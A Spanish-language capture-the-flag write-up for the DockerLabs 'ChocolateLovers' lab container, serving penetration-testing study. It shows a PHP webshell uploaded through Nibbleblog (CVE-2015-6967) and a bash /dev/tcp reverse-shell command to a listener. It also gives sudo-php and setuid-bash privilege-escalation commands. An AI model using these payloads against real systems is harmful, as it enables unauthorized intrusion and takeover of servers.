# DockerLabs - ChocolateLovers

Explotación del CMS Nibbleblog via file upload autenticado (CVE-2015-6967), escalada lateral por sudo php y escalada final a root modificando un script PHP ejecutado como root.

## Despliegue

```bash
bash auto_deploy.sh chocolatelovers.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puerto detectado:
- **80/tcp** — HTTP (Apache, página por defecto)

## Enumeración web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

Se descubre `/nibbleblog/` — instalación de Nibbleblog CMS.

## Acceso al panel — Credenciales por defecto

```
http://172.17.0.2/nibbleblog/admin.php
usuario: admin
password: admin
```

## Intrusión — CVE-2015-6967 (File Upload en My Image)

Nibbleblog permite subir archivos PHP a través del plugin **My Image** sin validar la extensión.

**Plugins → My Image → Configure** → subir `shell.php`:

```php
<?php system($_GET["cmd"]); ?>
```

Ignorar el error de imagen — el archivo se sube igualmente. Verificar RCE:

```
http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
```

Reverse shell (listener en 4444):

```
http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.17.0.1/4444+0>%261'
```

Acceso como **www-data**.

## Escalada — www-data → chocolate

```bash
sudo -l
# (chocolate) NOPASSWD: /usr/bin/php
```

GTFOBins con php:

```bash
sudo -u chocolate /usr/bin/php -r "system('/bin/bash');"
```

Acceso como **chocolate**.

## Tratamiento de TTY

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Escalada — chocolate → root

Buscar archivos escribibles:

```bash
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
# /opt/script.php  ← escribible por chocolate
```

Chocolate puede ejecutar ese script como root:

```bash
echo "chocolate" | sudo -S -l
# (root) /usr/bin/php /opt/script.php
```

Inyectar payload en el script:

```bash
echo '<?php system("chmod +s /bin/bash"); ?>' > /opt/script.php
echo "chocolate" | sudo -S /usr/bin/php /opt/script.php
bash -p
whoami
# root
```

## Conclusión

Cadena de ataque completa:

1. **Reconocimiento** — nmap detecta puerto 80, gobuster encuentra /nibbleblog/
2. **Login** — credenciales por defecto admin/admin en /nibbleblog/admin.php
3. **CVE-2015-6967** — upload de webshell PHP via plugin My Image
4. **Reverse shell** — acceso como www-data
5. **www-data → chocolate** — sudo php sin contraseña, GTFOBins `system('/bin/bash')`
6. **chocolate → root** — /opt/script.php escribible + sudo php como root → chmod +s /bin/bash → bash -p

**Lecciones aprendidas:**
- Las credenciales por defecto de CMS son el primer vector a probar siempre.
- CVE-2015-6967: Nibbleblog no valida extensiones en el plugin My Image — cualquier archivo se sube.
- `sudo` con binarios de scripting (php, python, perl) es RCE directo via GTFOBins.
- Scripts escribibles ejecutados con sudo como root son escalada trivial.
